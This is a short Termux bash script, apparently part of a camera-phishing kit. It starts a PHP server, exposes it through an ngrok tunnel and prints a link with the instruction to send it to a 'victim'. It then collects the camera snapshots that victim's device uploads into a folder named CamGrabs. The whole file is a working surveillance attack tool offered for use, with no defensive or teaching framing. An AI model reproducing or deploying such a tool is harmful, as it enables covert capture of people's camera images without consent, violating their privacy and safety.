#!/data/data/com.termux/files/usr/bin/bash

# Define storage path
storage_path="/sdcard/CamGrabs"
mkdir -p "$storage_path"

# Start PHP server
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
php_pid=$!

# Start ngrok
ngrok http 8080 > /dev/null 2>&1 &
sleep 5

# Get Ngrok public URL
url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z./?=_-]*' | head -n 1)

# Show URL to user
if [ -n "$url" ]; then
    echo "[*] Send this link to victim: $url"
else
    echo "[!] Failed to generate ngrok link. Is ngrok installed and working?"
    kill $php_pid
    exit 1
fi

# Wait for image upload
echo "[*] Images will be saved to $storage_path"
echo "[*] Press CTRL+C to stop."

# Watch for images and move them
while true; do
    if [ -d "camshots" ]; then
        mv camshots/*.jpg "$storage_path/" 2>/dev/null
    fi
    sleep 2
done
